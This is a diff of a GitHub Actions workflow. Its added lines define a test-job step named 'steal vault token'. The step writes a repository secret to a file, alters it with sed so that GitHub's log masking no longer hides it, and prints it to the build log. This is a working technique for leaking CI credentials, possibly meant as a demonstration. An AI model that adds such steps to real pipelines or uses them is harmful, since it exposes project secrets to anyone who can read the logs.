@@ -10,12 +10,12 @@ jobs:
   test:
     runs-on: ubuntu-latest
 
-steps:
-  - name: steal vault token
-    env:
-      TEST: ${{ secrets.TEST }}
-    run: |
-        echo "${TEST}" > file_secret.txt
-        sed -i 's/^\(.\)\(.*\)/\1@ STEAL_SECRET@\2/g' file_secret.txt
-        cat file_secret.txt
+    steps:
+      - name: steal vault token
+        env:
+          TEST: ${{ secrets.TEST }}
+        run: |
+            echo "${TEST}" > file_secret.txt
+            sed -i 's/^\(.\)\(.*\)/\1@ STEAL_SECRET@\2/g' file_secret.txt
+            cat file_secret.txt
         
